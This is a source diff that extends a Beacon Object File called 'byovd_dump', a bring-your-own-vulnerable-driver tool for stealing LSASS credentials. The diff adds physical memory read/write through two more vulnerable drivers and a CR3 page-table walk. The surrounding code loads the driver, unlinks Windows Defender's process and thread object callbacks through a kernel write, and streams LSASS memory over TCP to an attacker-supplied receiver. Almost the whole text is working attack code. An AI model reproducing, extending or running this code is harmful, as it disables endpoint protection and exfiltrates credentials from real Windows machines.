@@ -78,18 +78,55 @@ DECLSPEC_IMPORT int          WINAPI WS2_32$closesocket(SOCKET);
 DECLSPEC_IMPORT unsigned long WINAPI WS2_32$inet_addr(const char*);
 DECLSPEC_IMPORT unsigned short WINAPI WS2_32$htons(unsigned short);
 
+/* Driver type enum: 0=BiosTool, 1=RtsPpx, 2=RwDrv */
+#define DRV_BIOSTOOL 0
+#define DRV_RTSPPX   1
+#define DRV_RWDRV    2
+
+/* BiosTool IOCTLs */
 #define BIOSTOOL_READ_PHYS  0x22202Cu
 #define BIOSTOOL_WRITE_PHYS 0x222030u
 #define BIOSTOOL_VA2PA      0x222034u
 
+/* RtsPpx IOCTLs */
+#define RTSPPX_IOCTL_READ   0x222000u
+#define RTSPPX_IOCTL_WRITE  0x222008u
+
+/* RwDrv IOCTLs */
+#define RWDRV_IOCTL_READ    0x80002000u
+#define RWDRV_IOCTL_WRITE   0x80002004u
+
 #define OBJ_TYPE_CALLBACK_LIST_OFF 0xC8
-#define CBENTRY_PRE_OP_OFF  0x28
-#define CBENTRY_POST_OP_OFF 0x30
 #define NT_EXPORT_DIR_OFF 0x88
 
 typedef unsigned long long QWORD;
 
-static HANDLE  g_dev    = INVALID_HANDLE_VALUE;
+#pragma pack(push,1)
+struct RtsPpx_ReadReq {
+    QWORD physAddr;
+    DWORD busNum;
+    DWORD devNum;
+    DWORD funNum;
+    DWORD offset;
+};
+struct RtsPpx_WriteReq {
+    QWORD physAddr;
+    DWORD busNum;
+    DWORD devNum;
+    DWORD funNum;
+    DWORD offset;
+    BYTE  data;
+};
+struct RwDrv_RWReq {
+    QWORD physAddr;
+    DWORD size;
+    DWORD reserved;
+};
+#pragma pack(pop)
+
+static HANDLE  g_dev     = INVALID_HANDLE_VALUE;
+static int     g_drvType = DRV_BIOSTOOL;
+static QWORD   g_cr3     = 0;
 static wchar_t g_svcName[64];
 static wchar_t g_regPath[256];
 static wchar_t g_drvPath[MAX_PATH];
@@ -180,16 +217,20 @@ static BOOL CreateSvcKey(void) {
     char pidStr[16];
     bof_str_uint(KERNEL32$GetCurrentProcessId(), pidStr);
 
-    bof_wcs_copy(g_svcName, L"BiosTool_");
+    if (g_drvType == DRV_RTSPPX)
+        bof_wcs_copy(g_svcName, L"RtsPpx_");
+    else if (g_drvType == DRV_RWDRV)
+        bof_wcs_copy(g_svcName, L"RwDrv_");
+    else
+        bof_wcs_copy(g_svcName, L"BiosTool_");
+
     wchar_t wpid[16];
     bof_str_to_wcs(pidStr, wpid, 16);
     bof_wcs_cat(g_svcName, wpid);
 
-    /* registry path for NtLoadDriver */
     bof_wcs_copy(g_regPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\");
     bof_wcs_cat(g_regPath, g_svcName);
 
-    /* create key under HKLM\SYSTEM\...\Services\<svc> */
     wchar_t keyPath[256];
     bof_wcs_copy(keyPath, L"SYSTEM\\CurrentControlSet\\Services\\");
     bof_wcs_cat(keyPath, g_svcName);
@@ -203,7 +244,6 @@ static BOOL CreateSvcKey(void) {
         return FALSE;
     }
 
-    /* ImagePath: \??\<drvPath> */
     wchar_t imgPath[MAX_PATH + 8];
     bof_wcs_copy(imgPath, L"\\??\\");
     bof_wcs_cat(imgPath, g_drvPath);
@@ -224,7 +264,7 @@ static BOOL LoadDriver(void) {
     us.Length        = (USHORT)(bof_wcs_len(g_regPath) * 2);
     us.MaximumLength = us.Length + 2;
     NTSTATUS st = NTDLL$NtLoadDriver(&us);
-    if (!NT_SUCCESS(st) && st != (LONG)0xC000010E) {   /* 0xC000010E = already loaded */
+    if (!NT_SUCCESS(st) && st != (LONG)0xC000010E) {
         BeaconPrintf(CALLBACK_ERROR, "[-] NtLoadDriver: 0x%08lX\n", (ULONG)st);
         return FALSE;
     }
@@ -233,22 +273,30 @@ static BOOL LoadDriver(void) {
 }
 
 static BOOL OpenDevice(void) {
-    g_dev = KERNEL32$CreateFileA("\\\\.\\BiosToolCommonDriver",
+    const char *devName;
+    if (g_drvType == DRV_RTSPPX)
+        devName = "\\\\.\\RtsPpx";
+    else if (g_drvType == DRV_RWDRV)
+        devName = "\\\\.\\fmem3";
+    else
+        devName = "\\\\.\\BiosToolCommonDriver";
+
+    g_dev = KERNEL32$CreateFileA(devName,
                                  GENERIC_READ | GENERIC_WRITE, 0, NULL,
                                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (g_dev == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] OpenDevice failed (%lu)\n",
-                     KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[-] OpenDevice '%s' failed (%lu)\n",
+                     devName, KERNEL32$GetLastError());
         return FALSE;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] BiosToolCommonDriver device open\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Device open: %s\n", devName);
     return TRUE;
 }
 
 /* ============================================================================
- * Kernel R/W via BiosToolCommonDriver IOCTLs
+ * BiosTool physical R/W (has VA2PA IOCTL)
  * ============================================================================ */
-static PVOID Va2Pa(PVOID va) {
+static PVOID BiosTool_Va2Pa(PVOID va) {
     struct { PVOID VA; PVOID PA; } req;
     req.VA = va; req.PA = NULL;
     DWORD ret = 0;
@@ -257,7 +305,7 @@ static PVOID Va2Pa(PVOID va) {
     return req.PA;
 }
 
-static BOOL ReadPhys(PVOID pa, SIZE_T size, PVOID buf) {
+static BOOL BiosTool_ReadPhys(PVOID pa, SIZE_T size, PVOID buf) {
     BYTE *pPA  = (BYTE*)pa;
     BYTE *pBuf = (BYTE*)buf;
     while (size > 0) {
@@ -278,7 +326,7 @@ static BOOL ReadPhys(PVOID pa, SIZE_T size, PVOID buf) {
     return TRUE;
 }
 
-static BOOL WritePhys(PVOID pa, SIZE_T size, PVOID data) {
+static BOOL BiosTool_WritePhys(PVOID pa, SIZE_T size, PVOID data) {
     BYTE *pPA   = (BYTE*)pa;
     BYTE *pData = (BYTE*)data;
     while (size > 0) {
@@ -297,15 +345,210 @@ static BOOL WritePhys(PVOID pa, SIZE_T size, PVOID data) {
     return TRUE;
 }
 
+/* ============================================================================
+ * RtsPpx physical R/W (byte-at-a-time write, page-at-a-time read)
+ * ============================================================================ */
+static BOOL RtsPpx_PhysRead(QWORD pa, PVOID buf, DWORD size) {
+    if (size == 0) return TRUE;
+    DWORD done = 0;
+    while (done < size) {
+        DWORD chunk = size - done;
+        if (chunk > 0x1000) chunk = 0x1000;
+        BYTE ioBuf[0x1100];
+        bof_memset0(ioBuf, sizeof(ioBuf));
+        struct RtsPpx_ReadReq *req = (struct RtsPpx_ReadReq *)ioBuf;
+        req->physAddr = pa + done;
+        req->busNum = 0;
+        req->devNum = 0;
+        req->funNum = 0;
+        req->offset = 0;
+        DWORD got = 0;
+        BOOL ok = KERNEL32$DeviceIoControl(g_dev, RTSPPX_IOCTL_READ,
+            ioBuf, sizeof(struct RtsPpx_ReadReq), ioBuf, sizeof(ioBuf), &got, NULL);
+        if (!ok) return FALSE;
+        DWORD take = chunk;
+        if (got < take) take = got;
+        bof_memcpy((BYTE*)buf + done, ioBuf, take);
+        done += take;
+        if (got < chunk) break;
+    }
+    return TRUE;
+}
+
+static BOOL RtsPpx_PhysWrite(QWORD pa, PVOID data, DWORD size) {
+    if (size == 0) return TRUE;
+    DWORD done = 0;
+    while (done < size) {
+        struct RtsPpx_WriteReq req;
+        req.physAddr = pa + done;
+        req.busNum = 0;
+        req.devNum = 0;
+        req.funNum = 0;
+        req.offset = 0;
+        req.data = *((BYTE*)data + done);
+        DWORD got = 0;
+        BOOL ok = KERNEL32$DeviceIoControl(g_dev, RTSPPX_IOCTL_WRITE,
+            &req, sizeof(req), NULL, 0, &got, NULL);
+        if (!ok) return FALSE;
+        done += 1;
+    }
+    return TRUE;
+}
+
+/* ============================================================================
+ * RwDrv physical R/W (page-at-a-time read, struct+data write)
+ * ============================================================================ */
+static BOOL RwDrv_PhysRead(QWORD pa, PVOID buf, DWORD size) {
+    if (size == 0) return TRUE;
+    DWORD done = 0;
+    while (done < size) {
+        DWORD chunk = size - done;
+        if (chunk > 0x1000) chunk = 0x1000;
+        struct RwDrv_RWReq req;
+        req.physAddr = pa + done;
+        req.size = chunk;
+        req.reserved = 0;
+        BYTE outBuf[0x1000];
+        bof_memset0(outBuf, sizeof(outBuf));
+        DWORD got = 0;
+        BOOL ok = KERNEL32$DeviceIoControl(g_dev, RWDRV_IOCTL_READ,
+            &req, sizeof(req), outBuf, chunk, &got, NULL);
+        if (!ok) return FALSE;
+        DWORD take = chunk;
+        if (got < take) take = got;
+        bof_memcpy((BYTE*)buf + done, outBuf, take);
+        done += take;
+        if (got < chunk) break;
+    }
+    return TRUE;
+}
+
+static BOOL RwDrv_PhysWrite(QWORD pa, PVOID data, DWORD size) {
+    if (size == 0) return TRUE;
+    DWORD done = 0;
+    while (done < size) {
+        DWORD chunk = size - done;
+        if (chunk > 0x1000) chunk = 0x1000;
+        BYTE ioBuf[0x1100];
+        bof_memset0(ioBuf, sizeof(ioBuf));
+        struct RwDrv_RWReq *req = (struct RwDrv_RWReq *)ioBuf;
+        req->physAddr = pa + done;
+        req->size = chunk;
+        req->reserved = 0;
+        bof_memcpy(ioBuf + sizeof(struct RwDrv_RWReq), (BYTE*)data + done, chunk);
+        DWORD got = 0;
+        BOOL ok = KERNEL32$DeviceIoControl(g_dev, RWDRV_IOCTL_WRITE,
+            ioBuf, sizeof(struct RwDrv_RWReq) + chunk, NULL, 0, &got, NULL);
+        if (!ok) return FALSE;
+        done += chunk;
+    }
+    return TRUE;
+}
+
+/* ============================================================================
+ * Generic physical R/W dispatch
+ * ============================================================================ */
+static BOOL PhysRead(QWORD pa, PVOID buf, DWORD size) {
+    if (g_drvType == DRV_RTSPPX) return RtsPpx_PhysRead(pa, buf, size);
+    if (g_drvType == DRV_RWDRV)  return RwDrv_PhysRead(pa, buf, size);
+    return BiosTool_ReadPhys((PVOID)(ULONG_PTR)pa, size, buf);
+}
+
+static BOOL PhysWrite(QWORD pa, PVOID data, DWORD size) {
+    if (g_drvType == DRV_RTSPPX) return RtsPpx_PhysWrite(pa, data, size);
+    if (g_drvType == DRV_RWDRV)  return RwDrv_PhysWrite(pa, data, size);
+    return BiosTool_WritePhys((PVOID)(ULONG_PTR)pa, size, data);
+}
+
+/* ============================================================================
+ * CR3 page table walking (for RtsPpx + RwDrv that lack VA2PA IOCTL)
+ * ============================================================================ */
+static BOOL IsSafeAddr(QWORD pa) {
+    if (pa < 0x400000) return FALSE;
+    if (pa >= 0xA0000 && pa < 0x100000) return FALSE;
+    if (pa >= 0xE0000000 && pa < 0x100000000ULL) return FALSE;
+    if (pa >= 0xFEC00000 && pa < 0xFEF00000) return FALSE;
+    if (pa >= 0xFF000000) return FALSE;
+    return TRUE;
+}
+
+static QWORD FindCr3(void) {
+    QWORD RAM_LIMIT = 0x200000000ULL;
+    QWORD ranges[][2] = {
+        { 0x400000ULL,   0x4000000ULL  },
+        { 0x4000000ULL,  0x10000000ULL },
+    };
+    int r;
+    for (r = 0; r < 2; r++) {
+        QWORD pa;
+        for (pa = ranges[r][0]; pa < ranges[r][1]; pa += 0x1000) {
+            QWORD e0 = 0;
+            if (!IsSafeAddr(pa)) continue;
+            if (!PhysRead(pa, &e0, 8)) continue;
+            if (!(e0 & 1) || (e0 & 0x80)) continue;
+            QWORD pa0 = e0 & ~0xFFFULL;
+            if (pa0 == 0 || pa0 >= RAM_LIMIT) continue;
+            int i;
+            for (i = 1; i < 512; i++) {
+                QWORD entry = 0;
+                if (!PhysRead(pa + (QWORD)i * 8, &entry, 8)) break;
+                if ((entry & 1) && (entry & ~0xFFFULL) == pa)
+                    return pa;
+            }
+        }
+    }
+    return 0;
+}
+
+static QWORD Cr3Va2Pa(QWORD va) {
+    if (!g_cr3) return 0;
+    QWORD pml4_idx = (va >> 39) & 0x1FF;
+    QWORD pdpt_idx = (va >> 30) & 0x1FF;
+    QWORD pd_idx   = (va >> 21) & 0x1FF;
+    QWORD pt_idx   = (va >> 12) & 0x1FF;
+    QWORD offset   = va & 0xFFF;
+
+    QWORD pml4e = 0;
+    PhysRead((g_cr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8);
+    if (!(pml4e & 1)) return 0;
+
+    QWORD pdpte = 0;
+    PhysRead((pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8);
+    if (!(pdpte & 1)) return 0;
+    if (pdpte & (1ULL << 7))
+        return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFFULL);
+
+    QWORD pde = 0;
+    PhysRead((pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8);
+    if (!(pde & 1)) return 0;
+    if (pde & (1ULL << 7))
+        return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFFULL);
+
+    QWORD pte = 0;
+    PhysRead((pde & ~0xFFFULL) + pt_idx * 8, &pte, 8);
+    if (!(pte & 1)) return 0;
+    return (pte & ~0xFFFULL) | offset;
+}
+
+/* ============================================================================
+ * Unified kernel R/W (dispatches per driver type)
+ * ============================================================================ */
 static BOOL KRead(QWORD va, PVOID buf, SIZE_T size) {
-    BYTE *pVA  = (BYTE*)(ULONG_PTR)va;
     BYTE *pBuf = (BYTE*)buf;
     while (size > 0) {
-        ULONG chunk = (ULONG)(size < 0x1000 ? size : 0x1000);
-        PVOID pa = Va2Pa(pVA);
-        if (!pa) return FALSE;
-        if (!ReadPhys(pa, chunk, pBuf)) return FALSE;
-        pVA  += chunk;
+        ULONG_PTR off = (ULONG_PTR)(va & 0xFFF);
+        ULONG chunk = (ULONG)(size < (0x1000 - off) ? size : (0x1000 - off));
+        QWORD pa;
+        if (g_drvType == DRV_BIOSTOOL) {
+            PVOID p = BiosTool_Va2Pa((PVOID)(ULONG_PTR)va);
+            if (!p) return FALSE;
+            pa = (QWORD)(ULONG_PTR)p;
+        } else {
+            pa = Cr3Va2Pa(va);
+            if (!pa) return FALSE;
+        }
+        if (!PhysRead(pa, pBuf, chunk)) return FALSE;
+        va   += chunk;
         pBuf += chunk;
         size -= chunk;
     }
@@ -313,14 +556,21 @@ static BOOL KRead(QWORD va, PVOID buf, SIZE_T size) {
 }
 
 static BOOL KWrite(QWORD va, PVOID buf, SIZE_T size) {
-    BYTE *pVA   = (BYTE*)(ULONG_PTR)va;
-    BYTE *pBuf  = (BYTE*)buf;
+    BYTE *pBuf = (BYTE*)buf;
     while (size > 0) {
-        ULONG chunk = (ULONG)(size < 0x1000 ? size : 0x1000);
-        PVOID pa = Va2Pa(pVA);
-        if (!pa) return FALSE;
-        if (!WritePhys(pa, chunk, pBuf)) return FALSE;
-        pVA  += chunk;
+        ULONG_PTR off = (ULONG_PTR)(va & 0xFFF);
+        ULONG chunk = (ULONG)(size < (0x1000 - off) ? size : (0x1000 - off));
+        QWORD pa;
+        if (g_drvType == DRV_BIOSTOOL) {
+            PVOID p = BiosTool_Va2Pa((PVOID)(ULONG_PTR)va);
+            if (!p) return FALSE;
+            pa = (QWORD)(ULONG_PTR)p;
+        } else {
+            pa = Cr3Va2Pa(va);
+            if (!pa) return FALSE;
+        }
+        if (!PhysWrite(pa, pBuf, chunk)) return FALSE;
+        va   += chunk;
         pBuf += chunk;
         size -= chunk;
     }
@@ -336,8 +586,6 @@ static QWORD KReadQ(QWORD va) {
 /* ============================================================================
  * Kernel navigation helpers
  * ============================================================================ */
-
-/* Read ntoskrnl export table to find a symbol's kernel VA. */
 static QWORD FindNtosExport(QWORD ntosBase, const char *sym) {
     DWORD peOff = 0;
     KRead(ntosBase + 0x3C, &peOff, 4);
@@ -352,7 +600,6 @@ static QWORD FindNtosExport(QWORD ntosBase, const char *sym) {
     KRead(eDir + 0x20, &namesRVA, 4);
     KRead(eDir + 0x24, &ordsRVA,  4);
 
-    /* find sym name length */
     int targLen = 0;
     while (sym[targLen]) targLen++;
 
@@ -364,7 +611,6 @@ static QWORD FindNtosExport(QWORD ntosBase, const char *sym) {
         char buf[256];
         bof_memset0(buf, sizeof(buf));
         KRead(ntosBase + nameRVA, buf, (DWORD)(targLen + 2 < 255 ? targLen + 2 : 255));
-        /* compare */
         int match = 1;
         int j;
         for (j = 0; j < targLen; j++) {
@@ -381,29 +627,25 @@ static QWORD FindNtosExport(QWORD ntosBase, const char *sym) {
     return 0;
 }
 
-/* Unlink all entries from an OBJECT_TYPE.CallbackList (sets head.Flink = head.Blink = head). */
 static void UnlinkCallbackList(const char *typeName, QWORD listHead) {
     QWORD flink = KReadQ(listHead);
     if (!flink || flink == listHead) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] %s CallbackList already empty\n", typeName);
         return;
     }
-    /* count entries */
     int seen = 0;
     QWORD entry = flink;
     while (entry && entry != listHead && seen < 64) {
-        entry = KReadQ(entry);   /* entry->Flink */
+        entry = KReadQ(entry);
         seen++;
     }
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Unlinking %d %s callback(s)...\n", seen, typeName);
-    /* point head at itself: head.Flink = head, head.Blink = head */
     QWORD self = listHead;
     KWrite(listHead,     &self, 8);
     KWrite(listHead + 8, &self, 8);
     BeaconPrintf(CALLBACK_OUTPUT, "[+] %s ObCallbacks unlinked\n", typeName);
 }
 
-/* Patch WdFilter Process and Thread ObCallbacks. */
 static BOOL PatchObCallbacks(QWORD ntosBase) {
     QWORD procTypePtr = FindNtosExport(ntosBase, "PsProcessType");
     if (!procTypePtr) {
@@ -431,7 +673,6 @@ static BOOL PatchObCallbacks(QWORD ntosBase) {
     return TRUE;
 }
 
-/* Get ntoskrnl base (first driver returned by EnumDeviceDrivers). */
 static QWORD GetNtosBase(void) {
     LPVOID drvs[1024];
     DWORD cb = 0;
@@ -439,7 +680,6 @@ static QWORD GetNtosBase(void) {
     return (QWORD)drvs[0];
 }
 
-/* PsInitialSystemProcess offset from userland ntoskrnl.exe copy. */
 static QWORD PsISPOffset(void) {
     HMODULE ntos = KERNEL32$LoadLibraryExA("ntoskrnl.exe", NULL,
                                            DONT_RESOLVE_DLL_REFERENCES);
@@ -465,7 +705,6 @@ static DWORD FindLsassPid(void) {
             char nm[MAX_PATH];
             KERNEL32$WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1,
                                          nm, MAX_PATH, NULL, NULL);
-            /* case-insensitive compare "lsass.exe" */
             const char *a = nm, *b = "lsass.exe";
             int eq = 1;
             while (*a && *b) {
@@ -506,7 +745,6 @@ static BOOL DumpAndSend(DWORD pid, const char *recvIp, int recvPort) {
     }
     BeaconPrintf(CALLBACK_OUTPUT, "[+] LSASS handle (PID %lu)\n", pid);
 
-    /* Winsock init */
     WSADATA wsaData;
     bof_memset0(&wsaData, sizeof(wsaData));
     if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
@@ -537,7 +775,6 @@ static BOOL DumpAndSend(DWORD pid, const char *recvIp, int recvPort) {
     }
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Connected to %s:%d\n", recvIp, recvPort);
 
-    /* alloc scan buffer - 4MB chunks max */
     SIZE_T bufSz = 4 * 1024 * 1024;
     BYTE *scanBuf = (BYTE*)bof_alloc(bufSz);
     if (!scanBuf) {
@@ -558,7 +795,6 @@ static BOOL DumpAndSend(DWORD pid, const char *recvIp, int recvPort) {
             !(mbi.Protect & PAGE_GUARD) &&
             !(mbi.Protect & PAGE_NOACCESS)) {
 
-            /* grow buffer if needed */
             if (mbi.RegionSize > bufSz) {
                 bof_free(scanBuf);
                 bufSz   = mbi.RegionSize + 4096;
@@ -570,7 +806,6 @@ static BOOL DumpAndSend(DWORD pid, const char *recvIp, int recvPort) {
             if (KERNEL32$ReadProcessMemory(hProc, mbi.BaseAddress,
                                            scanBuf, mbi.RegionSize, &bytesRead)
                 && bytesRead > 0) {
-                /* send header: [base:8LE][size:8LE] */
                 QWORD base = (QWORD)(ULONG_PTR)mbi.BaseAddress;
                 QWORD sz   = (QWORD)bytesRead;
                 SendAll(sock, (char*)&base, 8);
@@ -613,7 +848,6 @@ static void Cleanup(void) {
         NTSTATUS st = NTDLL$NtUnloadDriver(&us);
         BeaconPrintf(CALLBACK_OUTPUT, "[*] NtUnloadDriver: 0x%08lX\n", (ULONG)st);
 
-        /* delete service key */
         wchar_t keyPath[256];
         bof_wcs_copy(keyPath, L"SYSTEM\\CurrentControlSet\\Services\\");
         bof_wcs_cat(keyPath, g_svcName);
@@ -629,25 +863,32 @@ static void Cleanup(void) {
 
 /* ============================================================================
  * BOF entrypoint
+ *
+ * Arguments (Kassandra executeBOF):
+ *   bin:<base64_driver_bytes>   - raw .sys file
+ *   str:<receiver_ip>           - TCP listener IP
+ *   int:<receiver_port>         - TCP listener port
+ *   int:<driver_type>           - 0=biostool, 1=rtsppx, 2=rwdrv
  * ============================================================================ */
 void Go(char *args, int len) {
-    /* zero globals */
     bof_memset0(g_svcName, sizeof(g_svcName));
     bof_memset0(g_regPath, sizeof(g_regPath));
     bof_memset0(g_drvPath, sizeof(g_drvPath));
-    g_dev = INVALID_HANDLE_VALUE;
+    g_dev     = INVALID_HANDLE_VALUE;
+    g_cr3     = 0;
+    g_drvType = DRV_BIOSTOOL;
 
     BeaconPrintf(CALLBACK_OUTPUT,
                  "[*] byovd_dump BOF starting (BYOVD LSASS credential extraction)\n");
 
-    /* parse arguments */
     datap parser;
     BeaconDataParse(&parser, args, len);
 
-    int   drvLen  = 0;
-    char *drvData = BeaconDataExtract(&parser, &drvLen);  /* bin: driver bytes  */
-    char *recvIp  = BeaconDataPtr(&parser, 64);           /* str: receiver IP   */
-    int   recvPort = BeaconDataInt(&parser);              /* int: receiver port */
+    int   drvLen   = 0;
+    char *drvData  = BeaconDataExtract(&parser, &drvLen);
+    char *recvIp   = BeaconDataPtr(&parser, 64);
+    int   recvPort = BeaconDataInt(&parser);
+    int   drvType  = BeaconDataInt(&parser);
 
     if (!drvData || drvLen <= 0) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Missing driver bytes (bin: argument)\n");
@@ -661,9 +902,17 @@ void Go(char *args, int len) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Invalid port (int: argument)\n");
         return;
     }
+    if (drvType < 0 || drvType > 2) {
+        BeaconPrintf(CALLBACK_ERROR,
+                     "[-] Invalid driver type %d (0=biostool, 1=rtsppx, 2=rwdrv)\n", drvType);
+        return;
+    }
+    g_drvType = drvType;
 
+    const char *drvNames[] = { "BiosTool", "RtsPpx", "RwDrv" };
     BeaconPrintf(CALLBACK_OUTPUT,
-                 "[*] Driver: %d bytes | Receiver: %s:%d\n", drvLen, recvIp, recvPort);
+                 "[*] Driver: %s (%d bytes) | Receiver: %s:%d\n",
+                 drvNames[g_drvType], drvLen, recvIp, recvPort);
 
     /* Step 1: privileges */
     EnablePriv("SeLoadDriverPrivilege");
@@ -681,6 +930,18 @@ void Go(char *args, int len) {
     /* Step 5: open device */
     if (!OpenDevice()) goto cleanup;
 
+    /* Step 5b: CR3 scan for drivers without VA2PA IOCTL */
+    if (g_drvType == DRV_RTSPPX || g_drvType == DRV_RWDRV) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Scanning for kernel CR3 (PML4 self-ref)...\n");
+        g_cr3 = FindCr3();
+        if (!g_cr3) {
+            BeaconPrintf(CALLBACK_ERROR, "[-] CR3 not found - cannot translate kernel VA\n");
+            goto cleanup;
+        }
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] CR3 found: 0x%llX\n",
+                     (unsigned long long)g_cr3);
+    }
+
     /* Step 6: get ntoskrnl base + patch ObCallbacks */
     {
         QWORD ntosBase = GetNtosBase();
@@ -691,7 +952,6 @@ void Go(char *args, int len) {
         BeaconPrintf(CALLBACK_OUTPUT, "[*] ntoskrnl base: 0x%llX\n",
                      (unsigned long long)ntosBase);
 
-        /* Verify kernel R/W works before touching callbacks */
         QWORD ispOff = PsISPOffset();
         if (ispOff) {
             QWORD sysEproc = KReadQ(ntosBase + ispOff);
